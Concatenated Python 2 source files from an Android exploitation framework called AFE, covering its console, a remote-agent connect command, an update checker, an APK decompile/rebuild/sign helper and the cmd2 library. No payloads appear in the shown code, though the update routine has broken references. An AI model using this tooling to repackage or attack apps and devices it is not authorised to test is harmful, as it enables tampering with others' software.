__FILENAME__ = afe
#!/usr/bin/python

import argparse, shlex, sys, urllib2, os, xml.dom.minidom
from xml.dom.minidom import parseString
from internals.lib.common import *
from internals.lib.basecmd import *
from internals.lib.menu import Menu
import readline
import rlcompleter

if 'libedit' in readline.__doc__:
    readline.parse_and_bind("bind ^I rl_complete")
else:
    readline.parse_and_bind("tab: complete")

class Afe(BaseCmd):

    def __init__(self):
        BaseCmd.__init__(self, None)
        self.prompt = "Afe$ "
        self.connected = 0
        #self.session = None
        self.intro = """
---- The Android Framework For Exploitation v2.0  ----
 _______  _______  _______                _______     _______ 
(  ___  )(  ____ \(  ____ \    |\     /|  / ___   )   (  __   )
| (   ) || (    \/| (    \/ _  | )   ( |  \/   )  |   | (  )  |
| (___) || (__    | (__    (_) | |   | |      /   )   | | /   |
|  ___  ||  __)   |  __)       ( (   ) )    _/   /    | (/ /) |
| (   ) || (      | (       _   \ \_/ /    /   _/     |   / | |
| )   ( || )      | (____/\(_)   \   /    (   (__/\ _ |  (__) |
|/     \||/       (_______/       \_/     \_______/(_)(_______)
                                                            
Copyright Reserved : XYS3C (Visit us at http://xysec.com)
----------------------------------------------------------
'help <command>' or '? <command>' gives help on <command>
        """

    def do_version(self, _args):
        """
Version and author information
        """
        print "\nAFE V" + version + "\n"
        print "XYSEC @ http://xysec.com\n"
        
    def do_connect(self, args):
        """
Connects to a remote TCP Server
usage: connect [--port <port>] ip
Use adb forward tcp:12346 tcp:12346 when using an emulator or usb-connected device
        """
        try:        
            parser = argparse.ArgumentParser(prog="connect", add_help = False)
            parser.add_argument('ip')
            parser.add_argument('--port', '-p', metavar = '<port>')
            splitargs = parser.parse_args(shlex.split(args))
            if not splitargs:
                return
            ip = splitargs.ip
            if (splitargs.port):
                port = int(splitargs.port)
            else:
                port = 12346
            self.session = Server(ip, port, "bind")
            self.session.sendData("ping\n")
            resp = self.session.receiveData()
            if (resp == "pong"):
                print "**Connected !"
                self.prompt = "*Afe$ "
                self.connected = 1
            else:
                print "**Not Connected !** There is some Problem, Try Again !"
        except:
            pass
        
    def do_menu(self, args):
	"""
Menu Screen, to cook with different recepies available ! 
	"""
	subconsole = Menu(self.connected, self.session)
	subconsole.cmdloop()

    def chunk_read(response, chunk_size=8192, report_hook=None):
           total_size = response.info().getheader('Content-Length').strip()
           total_size = int(total_size)
           bytes_so_far = 0
           data = []
           
           while 1:
               chunk = response.read(chunk_size)
               bytes_so_far += len(chunk)
               
               if not chunk:
                   break
               
               data += chunk
               if report_hook:
                   report_hook(bytes_so_far, chunk_size, total_size)
           
           return "".join(data)

    def _chunk_report(bytes_so_far, chunk_size, total_size):
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))

        if bytes_so_far >= total_size:
            sys.stdout.write('\n')
            
    def do_update(self, args):
        """
Check if there is an updated release available from http://afe-framework.com
        """
        print "\nChecking for updates \n"
        try:
            file = urllib2.urlopen("http://afe-framework.com/manifest.xml", timeout=5)
            data = file.read()
            file.close()
            dom = parseString(data)
            #retrieve the first xml tag (<version>version number</version>):
            xmlTag = dom.getElementsByTagName('version')[0].toxml()
            #strip off the tag (<version>version no</version> ---> version no):
            retversion = xmlTag.replace('<version>','').replace('</version>','')
            if (retversion != version):
                print "\nNot the latest Version! Please update it !\n"
                dum = raw_input("Do you want to update it now? (Y/n) ")
                if (dum.lower() == 'y'):
                    xmlfromtag = dom.getElementsByTagName('from')[0].toxml()
                    durl = xmlfromtag.replace('<from>','').replace('</from>','')
                    response = urllib2.urlopen(durl)
                    print durl
                    myFile = chunk_read(response, report_hook=chunk_report)
                    myFile = open('AFE-Chunked.zip', 'w')
                    myFile.write(fil)
                    myFile.close()
            else:
                print "\nYour AFE Version " + version + " is currently the updated and latest version !\n"
        except urllib2.URLError:
            print "\nCouldn't reach http://afe-framework.com\n"
        

if __name__ == '__main__':

    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    try:
        console = Afe()
        console.cmdloop()
    except:
	    pass

########NEW FILE########
__FILENAME__ = apkjet
#!/bin/env python

import sys, os
from optparse import OptionParser

#ApkToolPath = os.path.dirname(os.path.abspath(__file__))
ApkToolPath = 'c:\\\\android\\\\apkjet'


def sign_apk(fn, fn_new):
    if not fn_new:
        file_path, ext = os.path.splitext(fn)
        fn_new = r'%s_signed%s' %(file_path, ext)
    cmd = '''java -Xmx80m -jar %s/signapk.jar -w %s/testkey.x509.pem %s/testkey.pk8 %s %s''' % (
        ApkToolPath, ApkToolPath, ApkToolPath, fn, fn_new)
    print cmd
    os.system(cmd)
    print 'done!!! ... %s' % fn_new

def dec_apk(fn, path_new):
    if not path_new: 
        file_path, ext = os.path.splitext(fn)
        path_new = file_path.split('/')[-1] 
    cmd = '''java -Xmx80m -jar %s/apktool.jar d %s %s''' %(ApkToolPath, fn, path_new )
    print cmd
    os.system(cmd)
    print 'done!!! ... dir %s' %(path_new)

def bld_apk(file_path, fn_new):
    if not fn_new:
        fn_new = file_path.split('/')[-1]  + '.apk'
    cmd = '''java -Xmx80m -jar %s/apktool.jar b %s %s''' % (ApkToolPath, file_path, fn_new)
    os.system(cmd)
    print 'done!!! ... new apk file %s' %(fn_new)

def bsign_apk(file_path, fn_sign):
    if not fn_sign:
        path_new = file_path.split('/')[-1]
        fn_nosign = path_new  + '.apk'
        fn_sign = path_new + '_sign.apk'
    else:
        file_path, ext = os.path.splitext(fn)
        fn_nosign = file_path + '_nosign.apk'
    bld_apk(file_path, fn_nosign)
    print 'done!!! ... new apk before sign file %s' %(fn_nosign)
    sign_apk(fn_nosign, fn_sign)
    print 'done!!! ... new apk signed file %s' %(fn_sign)


def main():
    usage = "usage: %prog [options] args"
    parser = OptionParser(usage=usage)
    parser.add_option("-d", "--decompress", dest="dpath",
                  help="decompress apk file", metavar="decode")
    parser.add_option("-b", "--build", dest="bpath",
                  help="build apk file", metavar="build")
    parser.add_option("-s", "--sign", dest="sign",
                  help="sign apk file", metavar="sign")
    parser.add_option("-r", "--bulid_sign", dest="bsign",
                  help="build and sign apk file", metavar="bsign")

    (opts, args) = parser.parse_args()
    if opts.dpath:
        if len(args) > 0:
            new_path = args[0]
        else:
            new_path = None
        if os.path.isfile(opts.dpath):
            dec_apk(opts.dpath, new_path)
        else:
            parser.error("original apk file not exist")
    if opts.bpath:
        if len(args) > 0:
            new_apk = args[0]
        else:
            new_apk = None
        if opts.bpath and os.path.isdir(opts.bpath):
            bld_apk(opts.bpath, new_apk)
        else:
            parser.error("building dir not exist")
    if opts.sign:
        if len(args) > 0:
            new_apk = args[0]
        else:
            new_apk = None
        if opts.sign and os.path.isfile(opts.sign):
            sign_apk(opts.sign, new_apk)
        else:
            parser.error("apk file not exist")
    if opts.bsign:
        if len(args) > 0:
            new_apk = args[0]
        else:
            new_apk = None
        if os.path.isdir(opts.bsign):
            bsign_apk(opts.bsign, new_apk)
        else:
            parser.error("building dir not exist")
        
if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = basecmd
#!/usr/bin/env python
# encoding: utf-8
import cmd
import os
import readline
import rlcompleter
if 'libedit' in readline.__doc__:
    readline.parse_and_bind("bind ^I rl_complete")
else:
    readline.parse_and_bind("tab: complete")
class BaseCmd(cmd.Cmd):

    def __init__(self, session):
        cmd.Cmd.__init__(self)
        self.ruler = "-"
        self.doc_header = "Commands - type help <command> for more info"
        self.session = session
        self._hist = []      ## No history yet
        self._locals = {}      ## Initialize execution namespace for user
        self._globals = {}
        self.cmdline = None

    ## Command definitions to support Cmd object functionality ##
    def do_help(self, args):
        """
Get help on commands
'help' or '?' with no arguments prints a list of commands for which help is available
'help <command>' or '? <command>' gives help on <command>
        """
        ## The only reason to define this method is for the help text in the doc string
        cmd.Cmd.do_help(self, args)

    ## Override methods in Cmd object ##
    def preloop(self):
        """
Initialization before prompting user for commands.
Despite the claims in the Cmd documentaion, Cmd.preloop() is not a stub.
        """
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._hist = []      ## No history yet
        self._locals = {}      ## Initialize execution namespace for user
        self._globals = {}

    def postloop(self):
        """
Take care of any unfinished business.
Despite the claims in the Cmd documentaion, Cmd.postloop() is not a stub.
        """
        cmd.Cmd.postloop(self)   ## Clean up command completion

    def precmd(self, line):
        """
This method is called after the line has been input but before
it has been interpreted. If you want to modifdy the input line
before execution (for example, variable substitution) do it here.
        """
        self._hist += [ line.strip() ]
        return line

    def postcmd(self, stop, line):
        """
If you want to stop the console, return something that evaluates to true.
If you want to do some post command processing, do it here.
        """
        return stop


    def emptyline(self):
        """
Do nothing on empty input line
        """
        pass

    def default(self, line):
        """
Called on an input line when the command prefix is not recognized.
        """
        print "Command not found\n"
     
    def do_shell(self, args):
        """Pass command to a system shell when line begins with '!'"""
        os.system(args)

    def do_clear(self, line):
	    """
This command clears the screen or the terminal window!
	    """
	    if os.name == 'nt':
	        os.system('cls')
	    else:
	        os.system('clear')
    
    def do_quit(self, line):
        """
This command exits to the terminal window!
	""" 
        sys.exit(0)

########NEW FILE########
__FILENAME__ = cmd2
"""Variant on standard library's cmd with extra features.

To use, simply import cmd2.Cmd instead of cmd.Cmd; use precisely as though you
were using the standard library's cmd, while enjoying the extra features.

Searchable command history (commands: "hi", "li", "run")
Load commands from file, save to file, edit commands in file
Multi-line commands
Case-insensitive commands
Special-character shortcut commands (beyond cmd's "@" and "!")
Settable environment parameters
Optional _onchange_{paramname} called when environment parameter changes
Parsing commands with `optparse` options (flags)
Redirection to file with >, >>; input from file with <
Easy transcript-based testing of applications (see example/example.py)
Bash-style ``select`` available

Note that redirection with > and | will only work if `self.stdout.write()`
is used in place of `print`.  The standard library's `cmd` module is 
written to use `self.stdout.write()`, 

- Catherine Devlin, Jan 03 2008 - catherinedevlin.blogspot.com

mercurial repository at http://www.assembla.com/wiki/show/python-cmd2
"""
import cmd
import re
import os
import sys
import optparse
import subprocess
import tempfile
import doctest
import unittest
import datetime
import urllib
import glob
import traceback
import platform
import copy
from code import InteractiveConsole, InteractiveInterpreter
from optparse import make_option

if sys.version_info[0] > 2:
    import pyparsing_py3 as pyparsing
    raw_input = input
else:
    import pyparsing

__version__ = '0.6.2'

class OptionParser(optparse.OptionParser):
    def exit(self, status=0, msg=None):
        self.values._exit = True
        if msg:
            print (msg)
            
    def print_help(self, *args, **kwargs):
        try:
            print (self._func.__doc__)
        except AttributeError:
            pass
        optparse.OptionParser.print_help(self, *args, **kwargs)

    def error(self, msg):
        """error(msg : string)

        Print a usage message incorporating 'msg' to stderr and exit.
        If you override this in a subclass, it should not return -- it
        should either exit or raise an exception.
        """
        raise
        
def remaining_args(oldArgs, newArgList):
    '''
    Preserves the spacing originally in the argument after
    the removal of options.
    
    >>> remaining_args('-f bar   bar   cow', ['bar', 'cow'])
    'bar   cow'
    '''
    pattern = '\s+'.join(re.escape(a) for a in newArgList) + '\s*$'
    matchObj = re.search(pattern, oldArgs)
    return oldArgs[matchObj.start():]
   
def _attr_get_(obj, attr):
    '''Returns an attribute's value, or None (no error) if undefined.
       Analagous to .get() for dictionaries.  Useful when checking for
       value of options that may not have been defined on a given
       method.'''
    try:
        return getattr(obj, attr)
    except AttributeError:
        return None
    
optparse.Values.get = _attr_get_
    
options_defined = [] # used to distinguish --options from SQL-style --comments

def options(option_list):
    '''Used as a decorator and passed a list of optparse-style options,
       alters a cmd2 method to populate its ``opts`` argument from its
       raw text argument.

       Example: transform
       def do_something(self, arg):

       into
       @options([make_option('-q', '--quick', action="store_true",
                 help="Makes things fast")])
       def do_something(self, arg, opts):
           if opts.quick:
               self.fast_button = True
       '''
    if not isinstance(option_list, list):
        option_list = [option_list]
    for opt in option_list:
        options_defined.append(pyparsing.Literal(opt.get_opt_string()))
    def option_setup(func):
        optionParser = OptionParser()
        for opt in option_list:
            optionParser.add_option(opt)
        optionParser.set_usage("%s [options] arg" % func.__name__[3:])
        optionParser._func = func
        def new_func(instance, arg):
            try:
                opts, newArgList = optionParser.parse_args(arg.split())
                # Must find the remaining args in the original argument list, but 
                # mustn't include the command itself
                #if hasattr(arg, 'parsed') and newArgList[0] == arg.parsed.command:
                #    newArgList = newArgList[1:]
                newArgs = remaining_args(arg, newArgList)
                if isinstance(arg, ParsedString):
                    arg = arg.with_args_replaced(newArgs)
                else:
                    arg = newArgs
            except (optparse.OptionValueError, optparse.BadOptionError,
                    optparse.OptionError, optparse.AmbiguousOptionError,
                    optparse.OptionConflictError), e:
                print (e)
                optionParser.print_help()
                return
            if hasattr(opts, '_exit'):
                return None
            result = func(instance, arg, opts)                            
            return result        
        new_func.__doc__ = '%s\n%s' % (func.__doc__, optionParser.format_help())
        return new_func
    return option_setup

class PasteBufferError(EnvironmentError):
    if sys.platform[:3] == 'win':
        errmsg = """Redirecting to or from paste buffer requires pywin32
to be installed on operating system.
Download from http://sourceforge.net/projects/pywin32/"""
    else:
        errmsg = """Redirecting to or from paste buffer requires xclip 
to be installed on operating system.
On Debian/Ubuntu, 'sudo apt-get install xclip' will install it."""        
    def __init__(self):
        Exception.__init__(self, self.errmsg)

pastebufferr = """Redirecting to or from paste buffer requires %s
to be installed on operating system.
%s"""

if subprocess.mswindows:
    try:
        import win32clipboard
        def get_paste_buffer():
            win32clipboard.OpenClipboard(0)
            try:
                result = win32clipboard.GetClipboardData()
            except TypeError:
                result = ''  #non-text
            win32clipboard.CloseClipboard()
            return result            
        def write_to_paste_buffer(txt):
            win32clipboard.OpenClipboard(0)
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(txt)
            win32clipboard.CloseClipboard()        
    except ImportError:
        def get_paste_buffer(*args):
            raise OSError, pastebufferr % ('pywin32', 'Download from http://sourceforge.net/projects/pywin32/')
        write_to_paste_buffer = get_paste_buffer
else:
    can_clip = False
    try:
        subprocess.check_call('xclip -o -sel clip', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        can_clip = True
    except AttributeError:  # check_call not defined, Python < 2.5
        teststring = 'Testing for presence of xclip.'
        xclipproc = subprocess.Popen('xclip -sel clip', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        xclipproc.stdin.write(teststring)
        xclipproc.stdin.close()
        xclipproc = subprocess.Popen('xclip -o -sel clip', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)        
        if xclipproc.stdout.read() == teststring:
            can_clip = True
    except (subprocess.CalledProcessError, OSError, IOError):
        pass
    if can_clip:    
        def get_paste_buffer():
            xclipproc = subprocess.Popen('xclip -o -sel clip', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            return xclipproc.stdout.read()
        def write_to_paste_buffer(txt):
            xclipproc = subprocess.Popen('xclip -sel clip', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            xclipproc.stdin.write(txt.encode())
            xclipproc.stdin.close()
            # but we want it in both the "primary" and "mouse" clipboards
            xclipproc = subprocess.Popen('xclip', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            xclipproc.stdin.write(txt.encode())
            xclipproc.stdin.close()
    else:
        def get_paste_buffer(*args):
            raise OSError, pastebufferr % ('xclip', 'On Debian/Ubuntu, install with "sudo apt-get install xclip"')
        write_to_paste_buffer = get_paste_buffer
          
pyparsing.ParserElement.setDefaultWhitespaceChars(' \t')

class ParsedString(str):
    def full_parsed_statement(self):
        new = ParsedString('%s %s' % (self.parsed.command, self.parsed.args))
        new.parsed = self.parsed
        new.parser = self.parser
        return new       
    def with_args_replaced(self, newargs):
        new = ParsedString(newargs)
        new.parsed = self.parsed
        new.parser = self.parser
        new.parsed['args'] = newargs
        new.parsed.statement['args'] = newargs
        return new

class SkipToLast(pyparsing.SkipTo):
    def parseImpl( self, instring, loc, doActions=True ):
        resultStore = []
        startLoc = loc
        instrlen = len(instring)
        expr = self.expr
        failParse = False
        while loc <= instrlen:
            try:
                if self.failOn:
                    failParse = True
                    self.failOn.tryParse(instring, loc)
                    failParse = False
                loc = expr._skipIgnorables( instring, loc )
                expr._parse( instring, loc, doActions=False, callPreParse=False )
                skipText = instring[startLoc:loc]
                if self.includeMatch:
                    loc,mat = expr._parse(instring,loc,doActions,callPreParse=False)
                    if mat:
                        skipRes = ParseResults( skipText )
                        skipRes += mat
                        resultStore.append((loc, [ skipRes ]))
                    else:
                        resultStore,append((loc, [ skipText ]))
                else:
                    resultStore.append((loc, [ skipText ]))
                loc += 1
            except (pyparsing.ParseException,IndexError):
                if failParse:
                    raise
                else:
                    loc += 1
        if resultStore:
            return resultStore[-1]
        else:
            exc = self.myException
            exc.loc = loc
            exc.pstr = instring
            raise exc    

class StubbornDict(dict):
    '''Dictionary that tolerates many input formats.
    Create it with stubbornDict(arg) factory function.
    
    >>> d = StubbornDict(large='gross', small='klein')
    >>> sorted(d.items())
    [('large', 'gross'), ('small', 'klein')]
    >>> d.append(['plain', '  plaid'])
    >>> sorted(d.items())
    [('large', 'gross'), ('plaid', ''), ('plain', ''), ('small', 'klein')]
    >>> d += '   girl Frauelein, Maedchen\\n\\n shoe schuh'
    >>> sorted(d.items())
    [('girl', 'Frauelein, Maedchen'), ('large', 'gross'), ('plaid', ''), ('plain', ''), ('shoe', 'schuh'), ('small', 'klein')]
    '''    
    def update(self, arg):
        dict.update(self, StubbornDict.to_dict(arg))
    append = update
    def __iadd__(self, arg):
        self.update(arg)
        return self
    def __add__(self, arg):
        selfcopy = copy.copy(self)
        selfcopy.update(stubbornDict(arg))
        return selfcopy
    def __radd__(self, arg):
        selfcopy = copy.copy(self)
        selfcopy.update(stubbornDict(arg))
        return selfcopy    
        
    @classmethod
    def to_dict(cls, arg):
        'Generates dictionary from string or list of strings'
        if hasattr(arg, 'splitlines'):
            arg = arg.splitlines()
        if hasattr(arg, '__reversed__'):
            result = {}    
            for a in arg:
                a = a.strip()
                if a:
                    key_val = a.split(None, 1)
                    key = key_val[0]
                    if len(key_val) > 1:
                        val = key_val[1]
                    else:
                        val = ''
                    result[key] = val
        else:
            result = arg
        return result

def stubbornDict(*arg, **kwarg):
    '''
    >>> sorted(stubbornDict('cow a bovine\\nhorse an equine').items())
    [('cow', 'a bovine'), ('horse', 'an equine')]
    >>> sorted(stubbornDict(['badger', 'porcupine a poky creature']).items())
    [('badger', ''), ('porcupine', 'a poky creature')]
    >>> sorted(stubbornDict(turtle='has shell', frog='jumpy').items())
    [('frog', 'jumpy'), ('turtle', 'has shell')]
    '''
    result = {}
    for a in arg:
        result.update(StubbornDict.to_dict(a))
    result.update(kwarg)                      
    return StubbornDict(result)
        
def replace_with_file_contents(fname):
    if fname:
        try:
            result = open(os.path.expanduser(fname[0])).read()
        except IOError:
            result = '< %s' % fname[0]  # wasn't a file after all
    else:
        result = get_paste_buffer()
    return result      

class EmbeddedConsoleExit(SystemExit):
    pass

class EmptyStatement(Exception):
    pass

def ljust(x, width, fillchar=' '):
    'analogous to str.ljust, but works for lists'
    if hasattr(x, 'ljust'):
        return x.ljust(width, fillchar)
    else:
        if len(x) < width:
            x = (x + [fillchar] * width)[:width]
        return x
    
class Cmd(cmd.Cmd):
    echo = False
    case_insensitive = True     # Commands recognized regardless of case
    continuation_prompt = '> '  
    timing = False              # Prints elapsed time for each command
    # make sure your terminators are not in legalChars!
    legalChars = '!#$%.:?@_' + pyparsing.alphanums + pyparsing.alphas8bit  
    shortcuts = {'?': 'help', '!': 'shell', '@': 'load', '@@': '_relative_load'}
    excludeFromHistory = '''run r list l history hi ed edit li eof'''.split()
    default_to_shell = False
    noSpecialParse = 'set ed edit exit'.split()
    defaultExtension = 'txt'            # For ``save``, ``load``, etc.
    default_file_name = 'command.txt'   # For ``save``, ``load``, etc.
    abbrev = True                       # Abbreviated commands recognized
    current_script_dir = None
    reserved_words = []
    feedback_to_output = False          # Do include nonessentials in >, | output
    quiet = False                       # Do not suppress nonessential output
    debug = False
    locals_in_py = True
    kept_state = None
    settable = stubbornDict('''
        prompt
        colors                Colorized output (*nix only)
        continuation_prompt   On 2nd+ line of input
        debug                 Show full error stack on error
        default_file_name     for ``save``, ``load``, etc.
        editor                Program used by ``edit`` 	
        case_insensitive      upper- and lower-case both OK
        feedback_to_output    include nonessentials in `|`, `>` results 
        quiet                 Don't print nonessential feedback
        echo                  Echo command issued into output
        timing                Report execution times
        abbrev                Accept abbreviated commands
        ''')
    
    def poutput(self, msg):
        '''Convenient shortcut for self.stdout.write(); adds newline if necessary.'''
        if msg:
            self.stdout.write(msg)
            if msg[-1] != '\n':
                self.stdout.write('\n')
    def perror(self, errmsg, statement=None):
        if self.debug:
            traceback.print_exc()
        print (str(errmsg))
    def pfeedback(self, msg):
        """For printing nonessential feedback.  Can be silenced with `quiet`.
           Inclusion in redirected output is controlled by `feedback_to_output`."""
        if not self.quiet:
            if self.feedback_to_output:
                self.poutput(msg)
            else:
                print (msg)
    _STOP_AND_EXIT = True  # distinguish end of script file from actual exit
    _STOP_SCRIPT_NO_EXIT = -999
    editor = os.environ.get('EDITOR')
    if not editor:
        if sys.platform[:3] == 'win':
            editor = 'notepad'
        else:
            for editor in ['gedit', 'kate', 'vim', 'emacs', 'nano', 'pico']:
                if subprocess.Popen(['which', editor], stdout=subprocess.PIPE).communicate()[0]:
                    break

    colorcodes =    {'bold':{True:'\x1b[1m',False:'\x1b[22m'},
                  'cyan':{True:'\x1b[36m',False:'\x1b[39m'},
                  'blue':{True:'\x1b[34m',False:'\x1b[39m'},
                  'red':{True:'\x1b[31m',False:'\x1b[39m'},
                  'magenta':{True:'\x1b[35m',False:'\x1b[39m'},
                  'green':{True:'\x1b[32m',False:'\x1b[39m'},
                  'underline':{True:'\x1b[4m',False:'\x1b[24m'}}
    colors = (platform.system() != 'Windows')
    def colorize(self, val, color):
        '''Given a string (``val``), returns that string wrapped in UNIX-style 
           special characters that turn on (and then off) text color and style.
           If the ``colors`` environment paramter is ``False``, or the application
           is running on Windows, will return ``val`` unchanged.
           ``color`` should be one of the supported strings (or styles):
           red/blue/green/cyan/magenta, bold, underline'''
        if self.colors and (self.stdout == self.initial_stdout):
            return self.colorcodes[color][True] + val + self.colorcodes[color][False]
        return val

    def do_cmdenvironment(self, args):
        '''Summary report of interactive parameters.'''
        self.stdout.write("""
        Commands are %(casesensitive)scase-sensitive.
        Commands may be terminated with: %(terminators)s
        Settable parameters: %(settable)s\n""" % \
        { 'casesensitive': (self.case_insensitive and 'not ') or '',
          'terminators': str(self.terminators),
          'settable': ' '.join(self.settable)
        })
        
    def do_help(self, arg):
        if arg:
            funcname = self.func_named(arg)
            if funcname:
                fn = getattr(self, funcname)
                try:
                    fn.optionParser.print_help(file=self.stdout)
                except AttributeError:
                    cmd.Cmd.do_help(self, funcname[3:])
        else:
            cmd.Cmd.do_help(self, arg)
        
    def __init__(self, *args, **kwargs):        
        cmd.Cmd.__init__(self, *args, **kwargs)
        self.initial_stdout = sys.stdout
        self.history = History()
        self.pystate = {}
        self.shortcuts = sorted(self.shortcuts.items(), reverse=True)
        self.keywords = self.reserved_words + [fname[3:] for fname in dir(self) 
                                               if fname.startswith('do_')]            
        self._init_parser()
            
    def do_shortcuts(self, args):
        """Lists single-key shortcuts available."""
        result = "\n".join('%s: %s' % (sc[0], sc[1]) for sc in sorted(self.shortcuts))
        self.stdout.write("Single-key shortcuts for other commands:\n%s\n" % (result))

    prefixParser = pyparsing.Empty()
    commentGrammars = pyparsing.Or([pyparsing.pythonStyleComment, pyparsing.cStyleComment])
    commentGrammars.addParseAction(lambda x: '')
    commentInProgress  = pyparsing.Literal('/*') + pyparsing.SkipTo(
        pyparsing.stringEnd ^ '*/')
    terminators = [';']
    blankLinesAllowed = False
    multilineCommands = []
    
    def _init_parser(self):
        r'''
        >>> c = Cmd()
        >>> c.multilineCommands = ['multiline']
        >>> c.case_insensitive = True
        >>> c._init_parser()
        >>> print (c.parser.parseString('').dump())
        []
        >>> print (c.parser.parseString('').dump())
        []        
        >>> print (c.parser.parseString('/* empty command */').dump())
        []        
        >>> print (c.parser.parseString('plainword').dump())
        ['plainword', '']
        - command: plainword
        - statement: ['plainword', '']
          - command: plainword        
        >>> print (c.parser.parseString('termbare;').dump())
        ['termbare', '', ';', '']
        - command: termbare
        - statement: ['termbare', '', ';']
          - command: termbare
          - terminator: ;
        - terminator: ;        
        >>> print (c.parser.parseString('termbare; suffx').dump())
        ['termbare', '', ';', 'suffx']
        - command: termbare
        - statement: ['termbare', '', ';']
          - command: termbare
          - terminator: ;
        - suffix: suffx
        - terminator: ;        
        >>> print (c.parser.parseString('barecommand').dump())
        ['barecommand', '']
        - command: barecommand
        - statement: ['barecommand', '']
          - command: barecommand
        >>> print (c.parser.parseString('COMmand with args').dump())
        ['command', 'with args']
        - args: with args
        - command: command
        - statement: ['command', 'with args']
          - args: with args
          - command: command
        >>> print (c.parser.parseString('command with args and terminator; and suffix').dump())
        ['command', 'with args and terminator', ';', 'and suffix']
        - args: with args and terminator
        - command: command
        - statement: ['command', 'with args and terminator', ';']
          - args: with args and terminator
          - command: command
          - terminator: ;
        - suffix: and suffix
        - terminator: ;
        >>> print (c.parser.parseString('simple | piped').dump())
        ['simple', '', '|', ' piped']
        - command: simple
        - pipeTo:  piped
        - statement: ['simple', '']
          - command: simple
        >>> print (c.parser.parseString('double-pipe || is not a pipe').dump())
        ['double', '-pipe || is not a pipe']
        - args: -pipe || is not a pipe
        - command: double
        - statement: ['double', '-pipe || is not a pipe']
          - args: -pipe || is not a pipe
          - command: double
        >>> print (c.parser.parseString('command with args, terminator;sufx | piped').dump())
        ['command', 'with args, terminator', ';', 'sufx', '|', ' piped']
        - args: with args, terminator
        - command: command
        - pipeTo:  piped
        - statement: ['command', 'with args, terminator', ';']
          - args: with args, terminator
          - command: command
          - terminator: ;
        - suffix: sufx
        - terminator: ;
        >>> print (c.parser.parseString('output into > afile.txt').dump())
        ['output', 'into', '>', 'afile.txt']
        - args: into
        - command: output
        - output: >
        - outputTo: afile.txt
        - statement: ['output', 'into']
          - args: into
          - command: output   
        >>> print (c.parser.parseString('output into;sufx | pipethrume plz > afile.txt').dump())
        ['output', 'into', ';', 'sufx', '|', ' pipethrume plz', '>', 'afile.txt']
        - args: into
        - command: output
        - output: >
        - outputTo: afile.txt
        - pipeTo:  pipethrume plz
        - statement: ['output', 'into', ';']
          - args: into
          - command: output
          - terminator: ;
        - suffix: sufx
        - terminator: ;
        >>> print (c.parser.parseString('output to paste buffer >> ').dump())
        ['output', 'to paste buffer', '>>', '']
        - args: to paste buffer
        - command: output
        - output: >>
        - statement: ['output', 'to paste buffer']
          - args: to paste buffer
          - command: output
        >>> print (c.parser.parseString('ignore the /* commented | > */ stuff;').dump())
        ['ignore', 'the /* commented | > */ stuff', ';', '']
        - args: the /* commented | > */ stuff
        - command: ignore
        - statement: ['ignore', 'the /* commented | > */ stuff', ';']
          - args: the /* commented | > */ stuff
          - command: ignore
          - terminator: ;
        - terminator: ;
        >>> print (c.parser.parseString('has > inside;').dump())
        ['has', '> inside', ';', '']
        - args: > inside
        - command: has
        - statement: ['has', '> inside', ';']
          - args: > inside
          - command: has
          - terminator: ;
        - terminator: ;        
        >>> print (c.parser.parseString('multiline has > inside an unfinished command').dump())
        ['multiline', ' has > inside an unfinished command']
        - multilineCommand: multiline        
        >>> print (c.parser.parseString('multiline has > inside;').dump())
        ['multiline', 'has > inside', ';', '']
        - args: has > inside
        - multilineCommand: multiline
        - statement: ['multiline', 'has > inside', ';']
          - args: has > inside
          - multilineCommand: multiline
          - terminator: ;
        - terminator: ;        
        >>> print (c.parser.parseString('multiline command /* with comment in progress;').dump())
        ['multiline', ' command']
        - multilineCommand: multiline
        >>> print (c.parser.parseString('multiline command /* with comment complete */ is done;').dump())
        ['multiline', 'command /* with comment complete */ is done', ';', '']
        - args: command /* with comment complete */ is done
        - multilineCommand: multiline
        - statement: ['multiline', 'command /* with comment complete */ is done', ';']
          - args: command /* with comment complete */ is done
          - multilineCommand: multiline
          - terminator: ;
        - terminator: ;
        >>> print (c.parser.parseString('multiline command ends\n\n').dump())
        ['multiline', 'command ends', '\n', '\n']
        - args: command ends
        - multilineCommand: multiline
        - statement: ['multiline', 'command ends', '\n', '\n']
          - args: command ends
          - multilineCommand: multiline
          - terminator: ['\n', '\n']
        - terminator: ['\n', '\n']
        '''
        outputParser = (pyparsing.Literal('>>') | (pyparsing.WordStart() + '>') | pyparsing.Regex('[^=]>'))('output')
        
        terminatorParser = pyparsing.Or([(hasattr(t, 'parseString') and t) or pyparsing.Literal(t) for t in self.terminators])('terminator')
        stringEnd = pyparsing.stringEnd ^ '\nEOF'
        self.multilineCommand = pyparsing.Or([pyparsing.Keyword(c, caseless=self.case_insensitive) for c in self.multilineCommands])('multilineCommand')
        oneLineCommand = (~self.multilineCommand + pyparsing.Word(self.legalChars))('command')
        pipe = pyparsing.Keyword('|', identChars='|')
        self.commentGrammars.ignore(pyparsing.quotedString).setParseAction(lambda x: '')        
        afterElements = \
            pyparsing.Optional(pipe + pyparsing.SkipTo(outputParser ^ stringEnd)('pipeTo')) + \
            pyparsing.Optional(outputParser + pyparsing.SkipTo(stringEnd).setParseAction(lambda x: x[0].strip())('outputTo'))
        if self.case_insensitive:
            self.multilineCommand.setParseAction(lambda x: x[0].lower())
            oneLineCommand.setParseAction(lambda x: x[0].lower())
        if self.blankLinesAllowed:
            self.blankLineTerminationParser = pyparsing.NoMatch
        else:
            self.blankLineTerminator = (pyparsing.lineEnd + pyparsing.lineEnd)('terminator')
            self.blankLineTerminator.setResultsName('terminator')
            self.blankLineTerminationParser = ((self.multilineCommand ^ oneLineCommand) + pyparsing.SkipTo(self.blankLineTerminator).setParseAction(lambda x: x[0].strip())('args') + self.blankLineTerminator)('statement')
